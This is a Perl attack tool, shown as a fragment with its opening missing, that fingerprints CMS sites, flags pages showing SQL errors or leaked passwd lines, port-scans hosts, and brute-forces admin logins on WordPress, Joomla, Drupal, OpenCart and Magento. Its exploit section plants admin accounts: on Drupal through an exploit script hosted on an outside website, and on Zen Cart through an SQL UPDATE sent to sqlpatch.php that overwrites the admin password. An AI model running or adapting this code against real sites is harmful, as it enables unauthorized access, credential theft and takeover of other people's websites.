my $V_JOOM=("<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!");
my $V_TP=("Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern");
my $V_SMF=("<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF");
my $V_PhpBB=("Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB");
my $V_VB=("<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin|vBulletin Solutions\, Inc\. All rights reserved");
my $V_MyBB=("Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB");
my $V_CF=("<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style|DDoS protection by CloudFlare");
my $V_DRP=("name=\"Generator\" content=\"Drupal");
my $V_PN=("<meta name=\"generator\" content=\"PostNuke");
my $V_AT=("<a href=\"/about.php\">About ATutor");
my $V_PHPN=("<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke");
my $V_MD=("Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle|<meta name=\"key words\" content=\"moodle");
my $V_ACM=("Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS");
my $V_SS=("<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>");
my $V_MX=("<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx");
my $V_XO=("<meta name=\"generator\" content=\"XOOPS");
my $V_OSC=("Powered by osCommerce|<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce");
my $V_PSH=("<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank|Software para Ecommerce de PrestaShop");
my $V_BB2=("<meta name=\"generator\" content=\"b2evolution");
my $V_MG=("MAGENTO\, INC\. ALL RIGHTS RESERVED|Magento Ecommerce by Smart Solutions|Log into Magento Admin Page|Magento|powered by magento|name=\"dummy\" id=\"dummy\"|Site magento|index.php\customer\account\|skin\frontend\|powered by webforms");
my $V_ZC=("all rights reserved Zen Cart|<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart");
my $V_CC5=("Powered by concrete5|<meta name=\"generator\" content=\"concrete");
my $V_OCR=("Powered By OpenCart");
my $V_XSS=("You have an error in your SQL|Warning: mysql_|function.mysql|MySQL result index|MySQL Error|MySQL ODBC|MySQL Driver|mysqli.query|num_rows|mysql error:",
           "supplied argument is not a valid MySQL result resource|on MySQL result index|Error Executing Database Query|mysql_");
my $V_LFI=("root:x|root:x:0:0:|mysql:x:");
my $V_TODO=(".|a|e|i|o|u|,");
my $V_AFD=("DB_NAME|DB_USER|DB_PASSWORD");
my $V_LM=("image\/gif");

###################################################################

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent($auser[rand @auser]);
$ua->timeout (8);
 
#################### time work
my $check = $ua->get("$site")->content;
################### cms
print "SITE:";
print "$site";
print "CMS:";

if($check =~/$V_WP/) {
    print colored("[WORDPRESS]",'blue'),"\n";
open(save, '>>cms/wordpress.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_JOOM/) {
    print colored("[JOOMLA]",'blue'),"\n";
open(save, '>>cms/joomla.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_TP/) {
    print colored("[TEXTPATTERN]",'blue'),"\n";
open(save, '>>cms/textpattern.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_SMF/) {
    print colored("[SMF]",'blue'),"\n";
open(save, '>>cms/smf.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_PhpBB/) {
    print colored("[PHPBB]",'blue'),"\n";
open(save, '>>cms/phpbb.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_VB/) {
    print colored("[VBULLETIN]",'blue'),"\n";
open(save, '>>cms/vbulletin.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_MyBB/) {
    print colored("[MYBB]",'blue'),"\n";
open(save, '>>cms/mybb.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_CF/) {
    print colored("[CLOUDFARE]",'blue'),"\n";
open(save, '>>cms/cloudfare.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_DRP/) {
    print colored("[DRUPAL]",'blue'),"\n";
open(save, '>>cms/drupal.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_PN/) {
    print colored("[POSTNUKE]",'blue'),"\n";
open(save, '>>cms/postnuke.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_AT/) {
    print colored("[ATUTOR]",'blue'),"\n";
open(save, '>>cms/atutor.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_PHPN/) {
    print colored("[PHPNUKE]",'blue'),"\n";
open(save, '>>cms/phpnuke.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_MD/) {
    print colored("[MOODLE]",'blue'),"\n";
open(save, '>>cms/moodle.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_ACM/) {
    print colored("[ADAPTCMS]",'blue'),"\n";
open(save, '>>cms/adaptcms.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_SS/) {
    print colored("[SILVERSTRIPE]",'blue'),"\n";
open(save, '>>cms/silverstripe.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_MX/) {
    print colored("[MODX]",'blue'),"\n";
open(save, '>>cms/modx.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_XO/) {
    print colored("[XOOPS]",'blue'),"\n";
open(save, '>>cms/xoops.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_OSC/) {
    print colored("[OSCOMMERCE]",'blue'),"\n";
open(save, '>>cms/oscommerce.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_PSH/) {
    print colored("[PRESTASHOP]",'blue'),"\n";
open(save, '>>cms/prestashop.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_BB2/) {
    print colored("[B2EVOLUTION]",'blue'),"\n";
open(save, '>>cms/b2evolution.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_MG/) {
    print colored("[MAGENTO]",'blue'),"\n";
open(save, '>>cms/magento.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_ZC/) {
    print colored("[ZEN CART]",'blue'),"\n";
open(save, '>>cms/zencart.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_CC5/) {
    print colored("[CONCRETE5]",'blue'),"\n";
open(save, '>>cms/concrete5.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_OCR/) {
    print colored("[OPENCART]",'blue'),"\n";
open(save, '>>cms/opencart.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_XSS/) {
    print colored("[MySQL]",'blue'),"\n";
open(save, '>>cms/mysql.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_LFI/) {
    print colored("[LFI]",'blue'),"\n";
open(save, '>>cms/lfi.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_AFD/) {
    print colored("[DB]",'blue'),"\n";
open(save, '>>cms/db.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_LM/) {
    print colored("[LOKOMEDIA]",'blue'),"\n";
open(save, '>>cms/lokomedia.txt');
    print save "$site";
    close(save);
}
#################### UNKNOWN cms
else{
   print colored("[UNKNOWN]",'BOLD WHITE'),"\n";
}
print "==================================================================================================\n";
}
}
####################### PORT SCAN for IP
	 if (defined($ip_scan))
{
     print "[+] STARTING IP SCAN \n" ;
     print "[+] IP TO SCAN : $ip_scan\n\n\n" ;
ip_scan();
}

sub ip_scan {

$ip = "$ip_scan";
$ponto = "$ip_scan";

  ($ponto = $ip) || &uso();

  my %conectado = split /:/, 
  "tcpmux:1:compressnet:2:compressnet:3:rje:5:echo:7:discard:9:systat:11:daytime:13:qotd:17:msp:18:chargen:19:ftp-data:20:ftp:21:ssh:22:telnet:23:smtp:25:nsw-fe:27:msg-icp:29:msg-auth:31:dsp:33:time:37:rap:38:rlp:39:graphics:41:name:42:nameserver:42:nicname:43:mpm-flags:44:mpm:45:mpm-snd:46:ni-ftp:47:auditd:48:tacacs:49:re-mail-ck:50:la-maint:51:xns-time:52:domain:53:xns-ch:54:isi-gl:55:xns-auth:56:xns-mail:58:ni-mail:61:acas:62:whois++:63:covia:64:tacacs-ds:65:sql*net:66:bootps:67:bootpc:68:tftp:69:gopher:70:netrjs-1:71:netrjs-2:72:netrjs-3:73:netrjs-4:74:deos:76:vettcp:78:finger:79:http:80:www:80:www-http:80:hosts2-ns:81:xfer:82:mit-ml-dev:83:ctf:84:mit-ml-dev:85:mfcobol:86:kerberos:88:su-mit-tg:89:dnsix:90:mit-dov:91:npp:92:dcp:93:objcall:94:supdup:95:dixie:96:swift-rvf:97:tacnews:98:metagram:99:newacct:100:hostname:101:gppitnp:103:cso:105:csnet-ns:105:3com-tsmux:106:rtelnet:107:snagas:108:pop-3:110:sunrpc:111:mcidas:112:ident:113:auth:113:audionews:114:sftp:115:ansanotify:116:uucp-path:117:sqlserv:118:nntp:119:cfdptkt:120:erpc:121:smakynet:122:ntp:123:ansatrader:124:locus-map:125:nxedit:126:locus-con:127:gss-xlicen:128:pwdgen:129:cisco-fna:130:cisco-tna:131:cisco-sys:132:statsrv:133:ingres-net:134:epmap:135:profile:136:netbios-ns:137:netbios-dgm:138:netbios-ssn:139:emfis-data:140:emfis-cntl:141:bl-idm:142:imap:143:uma:144:uaac:145:iso-ip:147:jargon:148:aed-512:149:sql-net:150:hems:151:bftp:152:sgmp:153:netsc-prod:154:netsc-dev:155:sqlsrv:156:knet-cmp:157:pcmail-srv:158:nss-routing:159:sgmp-traps:160:snmp:161:snmptrap:162:cmip-man:163:cmip-agent:164:xns-courier:165:s-net:166:namp:167:rsvd:168:send:169:print-srv:170:multiplex:171:xyplex-mux:173:mailq:174:vmnet:175:genrad-mux:176:xdmcp:177:nextstep:178:bgp:179:ris:180:unify:181:audit:182:ocbinder:183:ocserver:184:remote-kis:185:kis:186:aci:187:mumps:188:qft:189:gacp:190:prospero:191:osu-nms:192:srmp:193:irc:194:dn6-nlm-aud:195:dn6-smm-red:196:dls:197:dls-mon:198:smux:199:src:200:at-rtmp:201:at-nbp:202:at-3:203:at-echo:204:at-5:205:at-zis:206:at-7:207:at-8:208:qmtp:209:anet:212:ipx:213:vmpwscs:214:softpc:215:CAIlic:216:dbase:217:mpp:218:uarps:219:fln-spx:221:rsh-spx:222:cdc:223:masqdialer:224:direct:242:sur-meas:243:dayna:244:link:245:dsp3270:246:subntbcst_tftp:247:bhfhs:248:rap:256:set:257:yak-chat:258:esro-gen:259:openport:260:nsiiops:261:arcisdms:262:hdap:263:bgmp:264:http-mgmt:280:personal-link:281:cableport-ax:282:rescap:283:corerjd:284:novastorbakcup:308:entrusttime:309:bhmds:310:asip-webadmin:311:vslmp:312:magenta-logic:313:opalis-robot:314:dpsi:315:decauth:316:zannet:317:pkix-timestamp:318:ptp-event:319:ptp-general:320:pip:321:rtsps:322:pdap:344:pawserv:345:zserv:346:fatserv:347:csi-sgwp:348:mftp:349:matip-type-a:350:matip-type-b:351:bhoetty:351:dtag-ste-sb:352:bhoedap4:352:ndsauth:353:datex-asn:355:bhevent:357:shrinkwrap:358:tenebris_nts:359:scoi2odialog:360:semantix:361:srssend:362:rsvp_tunnel:363:aurora-cmgr:364:dtk:365:odmr:366:mortgageware:367:qbikgdp:368:rpc2portmap:369:clearcase:371:ulistproc:372:legent-1:373:legent-2:374:hassle:375:nip:376:tnETOS:377:dsETOS:378:is99c:379:is99s:380:hp-collector:381:hp-managed-node:382:hp-alarm-mgr:383:arns:384:ibm-app:385:asa:386:aurp:387:ldap:389:uis:390:synotics-relay:391:synotics-broker:392:dis:393:embl-ndt:394:netcp:395:netware-ip:396:mptn:397:kryptolan:398:iso-tsap-c2:399:work-sol:400:ups:401:genie:402:decap:403:nced:404:ncld:405:imsp:406:timbuktu:407:prm-sm:408:prm-nm:409:decladebug:410:rmt:411:synoptics-trap:412:smsp:413:infoseek:414:bnet:415:silverplatter:416:onmux:417:hyper-g:418:ariel1:419:smpte:420:ariel2:421:ariel3:422:opc-job-start:423:opc-job-track:424:icad-el:425:smartsdp:426:svrloc:427:ocs_cmu:428:ocs_amu:429:utmpsd:430:utmpcd:431:iasd:432:nnsp:433:mobileip-agent:434:mobilip-mn:435:dna-cml:436:comscm:437:dsfgw:438:dasp:439:sgcp:440:decvms-sysmgt:441:cvc_hostd:442:https:443:snpp:444:microsoft-ds:445:ddm-rdb:446:ddm-dfm:447:ddm-ssl:448:as-servermap:449:tserver:450:sfs-smp-net:451:sfs-config:452:creativeserver:453:contentserver:454:creativepartnr:455:macon-tcp:456:scohelp:457:appleqtc:458:ampr-rcmd:459:skronk:460:datasurfsrv:461:datasurfsrvsec:462:alpes:463:kpasswd:464:digital-vrc:466:mylex-mapd:467:photuris:468:rcp:469:scx-proxy:470:mondex:471:ljk-login:472:hybrid-pop:473:tcpnethaspsrv:475:ss7ns:477:spsc:478:iafserver:479:iafdbase:480:ph:481:bgs-nsi:482:ulpnet:483:integra-sme:484:powerburst:485:avian:486:saft:487:gss-http:488:nest-protocol:489:micom-pfs:490:go-login:491:ticf-1:492:ticf-2:493:pov-ray:494:intecourier:495:pim-rp-disc:496:dantz:497:siam:498:iso-ill:499:isakmp:500:stmf:501:asa-appl-proto:502:intrinsa:503:citadel:504:mailbox-lm:505:ohimsrv:506:crs:507:xvttp:508:snare:509:fcp:510:passgo:511:exec:512:login:513:shell:514:printer:515:videotex:516:talk:517:ntalk:518:utime:519:efs:520:ripng:521:ulp:522:ncp:524:timed:525:tempo:526:stx:527:custix:528:irc-serv:529:courier:530:conference:531:netnews:532:netwall:533:mm-admin:534:iiop:535:opalis-rdv:536:nmsp:537:gdomap:538:apertus-ldp:539:uucp:540:uucp-rlogin:541:commerce:542:klogin:543:kshell:544:appleqtcsrvr:545:dhcpv6-client:546:dhcpv6-server:547:afpovertcp:548:idfp:549:new-rwho:550:cybercash:551:deviceshare:552:pirp:553:rtsp:554:dsf:555:remotefs:556:openvms-sysipc:557:sdnskmp:558:teedtap:559:rmonitor:560:monitor:561:chshell:562:nntps:563:9pfs:564:whoami:565:streettalk:566:banyan-rpc:567:ms-shuttle:568:ms-rome:569:meter:570:meter:571:sonar:572:banyan-vip:573:ftp-agent:574:vemmi:575:ipcd:576:vnas:577:ipdd:578:decbsrv:579:sntp-heartbeat:580:bdp:581:scc-security:582:philips-vc:583:keyserver:584:imap4-ssl:585:password-chg:586:submission:587:cal:588:eyelink:589:tns-cml:590:http-alt:591:eudora-set:592:http-rpc-epmap:593:tpip:594:cab-protocol:595:smsd:596:ptcnameservice:597:acp:599:ipcserver:600:urm:606:nqs:607:sift-uft:608:npmp-trap:609:npmp-local:610:npmp-gui:611:hmmp-ind:612:hmmp-op:613:sshell:614:sco-inetmgr:615:sco-sysmgr:616:sco-dtmgr:617:dei-icda:618:digital-evm:619:sco-websrvrmgr:620:escp-ip:621:collaborator:622:aux_bus_shunt:623:cryptoadmin:624:dec_dlm:625:asia:626:passgo-tivoli:627:qmqp:628:rda:630:ipp:631:bmpp:632:servstat:633:ginad:634:rlzdbase:635:ldaps:636:lanserver:637:mcns-sec:638:msdp:639:entrust-sps:640:repcmd:641:sanity:643:dwr:644:pssc:645:ldp:646:dhcp-failover:647:rrp:648:aminet:649:obex:650:ieee-mms:651:udlr-dtcp:652:repscmd:653:aodv:654:tinc:655:spmp:656:rmc:657:tenfold:658:url-rendezvous:659:mac-srvr-admin:660:hap:661:pftp:662:purenoise:663:mdqs:666:doom:666:disclose:667:mecomm:668:meregister:669:vacdsm-sws:670:vacdsm-app:671:vpps-qua:672:cimplex:673:acap:674:dctp:675:vpps-via:676:vpp:677:ggf-ncp:678:mrm:679:entrust-aaas:680:entrust-aams:681:xfr:682:corba-iiop:683:corba-iiop-ssl:684:mdc-portmapper:685:hcp-wismar:686:asipregistry:687:realm-rusd:688:elcsd:704:agentx:705:borland-dsj:707:entrust-kmsh:709:entrust-ash:710:cisco-tdp:711:netviewdm1:729:netviewdm2:730:netviewdm3:731:netgw:741:netrcs:742:flexlm:744:fujitsu-dev:747:ris-cm:748:kerberos-adm:749:rfile:750:pump:751:qrh:752:rrh:753:tell:754:nlogin:758:con:759:ns:760:rxe:761:quotad:762:cycleserv:763:omserv:764:webster:765:phonebook:767:vid:769:cadlock:770:rtip:771:cycleserv2:772:submit:773:rpasswd:774:entomb:775:wpages:776:multiling-http:777:wpgs:780:concert:786:qsc:787:mdbs_daemon:800:device:801:fcp-udp:810:itm-mcell-s:828:pkix-3-ca-ra:829:rsync:873:iclcnet-locate:886:iclcnet_svinfo:887:accessbuilder:888:cddbp:888:omginitialrefs:900:xact-backup:911:ftps-data:989:ftps:990:nas:991:telnets:992:imaps:993:ircs:994:pop3s:995:vsinet:996:maitrd:997:busboy:998:garcon:999:puprouter:999:cadlock:1000:surf:1010:raserver:4000:cpanel:2082";

  %conectado = reverse %conectado;

  my @portas = sort por_numero keys %conectado;


  ### Principal
  &config($ip);
  &comeca_festa;
  exit;  
  ###


  ### Funcoes 
  
sub comeca_festa {
  my $nportas = 0;
  foreach $porta (@portas) {
	# cria socket
    $sock = IO::Socket::INET->new("$ponto:$porta");
	
	# se sock, entao imprima dados
	
	if($sock) {
  	  print "Port $porta\t$conectado{$porta}\n";
	  $nportas++;

	}
  }
  
  # finaliza
  print "\n\n$nportas opened in $ponto\n";
}
sub por_numero {
    if ( $a < $b ) { -1 }
    elsif ( $a > $b ) { 1 }
    else { 0 }
}

# configura titulo, e limpa a tela
sub config {

  system("clear");

  my $titulo = "PORTSCANNER - ";
  $titulo = $titulo.$_[0];

  print colored ("=" x length($titulo),'blue');
  print "\n";
  printf("%s\n", $titulo);
  print colored ("=" x length($titulo),'blue');
  print "\n";
}
sub uso{
print "You are leaveing the port scan\n\n";
exit;
}
}
##############################
######### BRUTEFORCE #########
##############################
	 if (defined($br_list))
{
     print "[+] SCANNING SITES\n" ;
     print "[+] LIST TO BRUTE FORCE : $br_list\n\n\n" ;
$list= "$br_list";
	 br();
}

sub br {
use URI::URL;
use Getopt::Long;

    open (THETARGET, "<$list") || die "[-] ERROR FILE";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print "\n\n[*] URL: $site";
cms();
}
}

sub cms(){
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $cms = $ua->get("$site")->content;
if($cms =~/<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress|<meta name=\"generator\" content=\"WordPress|\/wp-content\/(.*).js/) {
   print color("bold white"), " - WordPress\n\n";
wpuser();
}

elsif($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
   print color("bold white"), " - Joomla\n\n"; 
joomlabr();
}
elsif($cms =~/name=\"Generator\" content=\"Drupal|Drupal|drupal|sites\/all|drupal.org/) {
   print color("bold white"), " - Drupal\n\n";
drupalbr();
}

elsif($cms =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
   print color("bold white"), " - OpenCart\n\n";
opencartbr();
}

elsif($magcms =~/MAGENTO\, INC\. ALL RIGHTS RESERVED|Magento Ecommerce by Smart Solutions|Log into Magento Admin Page|Magento|powered by magento|name=\"dummy\" id=\"dummy\"|Site magento|index.php\customer\account\|skin\frontend\|powered by webforms/) {
   print color("bold white"), " - Magento\n\n";
magentobr();
}
else{
print color("bold white"), " - IDK\n\n";
}
}

sub wpuser{
print color('reset');
$user = $site . '/?author=1';

$getuser = $ua->get($user)->content;
if($getuser =~/author\/(.*?)\//){
$wpuser=$1;
print "[+] Username: $wpuser\n";
wp();
}
else {
print "Can't Get Username\n\n";
}
}

sub wp{
print"[-] START BRUTE\n";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$wp = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpass = $_;
print "[-] Trying: $wpass ";
$wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $ua->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){

print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');

open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$wp ==> User: $wpuser Pass: $wpass\n";
close (TEXT);
next OUTER;
}
}
}
}

sub joomlabr{
$joomsite = $site . '/administrator/index.php';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );


$getoken = $ua->get($joomsite)->content;
if ( $getoken =~ /name="(.*)" value="1"/ ) {
$token = $1 ;
}else{
print "[-] Can't Grabb Joomla Token !\n";
next OUTER;
}

print"[-] START BRUTE";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$joomuser = admin;
$joompass = $_;
print "\n[-] Trying: $joompass ";
$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
$response = $ua->request($joomlabrute);

my $check = $ua->get("$joomsite")->content;
if ($check =~ /logout/){
print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');

open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
close (TEXT);
next OUTER;
}
}
}

sub drupalbr{
print"[-] START BRUTE";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$druser = admin;
$drupass = $_;
print "\n[-] Trying: $drupass ";

$drupal = $site . '/user/login';
$redirect = $site . '/user/1';

$drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $redirect];
$response = $ua->request($drupalbrute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');

open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$drupal => User: $druser Pass: $drupass\n";
close (TEXT);
next OUTER;
}
}
}

sub opencartbr{
print"[-] START BRUTE";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print "\n[-] Trying: $ocpass ";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');
open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
next OUTER;
}
}
}

sub magentobr{
$magsite = $site . '/admin';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
    
$getoken = $ua->get($magsite)->content;
if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
$token = $1 ;
}else{
print "[-] Can't Grabb Magento Token !\n";
next OUTER;
}

print"[-] START BRUTE";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$maguser = "admin";
$magpass = $_;
print "\n[-] Trying: $magpass ";

$magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
$response = $ua->request($magbrute);
my $pwnd = $ua->get("$magsite")->content;
if ($pwnd =~ /logout/){
print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');
open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$magsite => User: $maguser Pass: $magpass\n";
close (TEXT);
next OUTER;
}
}
}


##############################
########## EXPLOIT ###########
##############################
	 if (defined($ex_list))
{
     print "[+] EXPLOITING SITES\n" ;
     print "[+] LIST TO EXPLOIT : $ex_list\n\n\n" ;
ex();
}

sub ex {
open (ex_list, "<$ex_list") || die "\n [LIST NOT FOUND]";
my @ex_list = <ex_list>;
close ex_list;
 
foreach $site(@ex_list) {
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
exdetect();
}
}

sub exdetect {
my $check = $ag1->get("$site")->content;
my $V_ZC=("all rights reserved Zen Cart|<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart");
my $V_DRP=("name=\"Generator\" content=\"Drupal|Drupal|drupal|sites\/all|drupal.org/");
my $V_WP=("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress|<meta name=\"generator\" content=\"WordPress|\/wp-content\/(.*).js");
my $V_JOOM=("<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!");
my $V_XSS=("You have an error in your SQL|Warning: mysql_|function.mysql|MySQL result index|MySQL Error|MySQL ODBC|MySQL Driver|mysqli.query|num_rows|mysql error:",
           "supplied argument is not a valid MySQL result resource|on MySQL result index|Error Executing Database Query|mysql_fetch_|The used SELECT statements have a different number of columns|SQL query failed|mysql_");
if($check =~/$V_ZC/) {
    print colored("[ZEN CART]: $site",'blue'),"\n";
open(save, '>>cms/zencart.txt');
    print save "$site";
    close(save);
zencart();
}
elsif($check =~/$V_DRP/) {
    print colored("[DRUPAL]: $site",'blue'),"\n";
open(save, '>>cms/drupal.txt');
    print save "$site";
    close(save);
drupal();
}
else{
   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
   open(save, '>>cms/UNKNOWN.txt');
   print save "$site";
   close(save);
}
}

sub drupal {

$drupalink = "http://phuongnammobile.vn/drupal.php"; # make sure to check link if it still work , if its not upload it yourself [ you can do it with wampp ( windows ) or with apache2 ( linux ) ]
my $exploit = "$drupalink?url=$site&submit=submit";
$admin ="M0B";
$pass  ="M0B";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ag1->get("$exploit")->content;
if($checkk =~/Success!/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold green'),"[VULN]\n\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $dr\n";
print color('bold white'),"USER : $admin\n";
print color('bold white'),"PASS : $pass\n";
open (TEXT, '>>rez/drupal.txt');
print TEXT "\nURL : $dr\n";
print TEXT "USER : $admin\n";
print TEXT "PASS : $pass\n\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold red'),"[FAILED]\n\n";
}
}

sub zencart {
$target = $site;
$target = "$site";
my $re = &exploit($target);

if ($re =~ /1 statements processed/i){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"ZEN CART Add Admin";
print color('bold green'),"[VULN]\n\n";
open (TEXT, '>>rez/zencart.txt');
print TEXT "\nURL : $target\n";
print TEXT "USER : admincrash\n";
print TEXT "PASS : wew\n";
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"ZEN CART Add Admin";
print color('bold red'),"[FAILED]\n\n";
}
}
sub exploit(){
$url = $_[0];
my $browser = LWP::UserAgent->new();
my $responde = HTTP::Request->new(POST => $url."/admin/sqlpatch.php/password_forgotten.php?action=execute");
$responde->content_type("application/x-www-form-urlencoded");
$responde->content("query_string=UPDATE admin SET admin_name='admincrash', admin_email='admin@shopadmin.com', admin_pass='617ec22fbb8f201c366e9848c0eb6925:87' WHERE admin_id='1';");
$browser->request($responde)->as_string
}

